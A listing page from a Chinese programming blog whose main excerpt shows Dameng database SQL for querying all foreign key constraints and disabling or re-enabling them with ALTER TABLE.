	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbdc9dd656886f8825671a092274050b/" rel="bookmark">
			达梦数据库查询所有外键约束并关闭
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 查询所有外键约束
SELECT ALL_CONS_COLUMNS.TABLE_NAME, ALL_CONS_COLUMNS.CONSTRAINT_NAME, ALL_CONS_COLUMNS.OWNER FROM SYSCONS, SYSOBJECTS, ALL_CONS_COLUMNS WHERE SYSCONS.id=SYSOBJECTS.id --'F'代表外键，'P'代表主键，'U'唯一索引 AND SYSCONS.TYPE$='F' AND SYSOBJECTS.name=ALL_CONS_COLUMNS.CONSTRAINT_NAME -- 下面的用户名改成你的用户名，不加的话系统表中的约束也会查出来 AND ALL_CONS_COLUMNS.OWNER='用户名'; 关闭和开启外键约束
-- 关闭外键约束检查 ALTER TABLE 表名 DISABLE CONSTRAINT 约束名; -- 开启外键约束检查 ALTER TABLE 表名 ENABLE CONSTRAINT 约束名; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42093a6a9764abfe4cc8e55918a9da86/" rel="bookmark">
			博客背景图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/138/">«</a>
	<span class="pagination__item pagination__item--current">139/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/140/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>